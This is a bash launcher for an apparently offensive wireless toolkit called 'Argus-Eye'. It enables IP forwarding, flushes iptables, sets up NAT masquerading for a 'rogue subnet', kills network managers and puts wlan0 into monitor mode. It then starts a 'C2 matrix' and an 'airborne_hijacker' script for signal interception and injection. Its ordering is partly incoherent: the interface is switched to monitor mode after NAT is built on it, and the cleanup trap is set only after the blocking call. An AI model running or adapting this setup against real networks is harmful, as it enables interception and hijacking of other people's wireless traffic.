#!/bin/bash
# ARGUS-EYE INTEGRATED AUTOMATED DEPLOYMENT SCRIPT

# Check execution privileges
if [ "$EUID" -ne 0 ]; then 
  echo "[-] Critical Error: Please execute as root (sudo)."
  exit 1
fi

echo "[*] Launching Argus-Eye Auto-Sensing Engine..."

# Step 1: Dynamically capture the current live IP address of wlan0
# This eliminates manual IPv4 hardcoding in files
DYNAMIC_KALI_IP=$(ip -4 addr show wlan0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}')

if [ -z "$DYNAMIC_KALI_IP" ]; then
  echo "[-] Critical Error: wlan0 has no active IP allocation. Check connectivity."
  exit 1
else
  echo "[+] Environment Discovered: wlan0 active IP is $DYNAMIC_KALI_IP"
fi

# Step 2: Enable Linux Kernel IP Forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Flush previous firewall state to prevent routing isolation
iptables --flush
iptables -t nat --flush

# Establish dynamic NAT/Masquerade bridge between rogue subnet and captured IP
iptables -t nat -A POSTROUTING -o wlan0 -j MASQUERADE
iptables -A FORWARD -i wlan0 -j ACCEPT

# Step 3: Shift hardware interface to monitor state directly
airmon-ng check kill
iw dev wlan0 set type monitor
ifconfig wlan0 up
iw dev wlan0 set bitrates legacy 2.4 1

# Step 4: Launch tactical C2 matrix screen on secondary thread
python3 argus_core/video_matrix.py &
MATRIX_PID=$!
sleep 2

# Step 5: Execute targeted airspace scanning and injection sequence
echo "[!] Commencing automated signal interception on wlan0..."
python3 argus_core/airborne_hijacker.py wlan0

# System recovery trap to restore system firewall state upon interruption
trap "iptables --flush; iptables -t nat --flush; kill $MATRIX_PID; exit" INT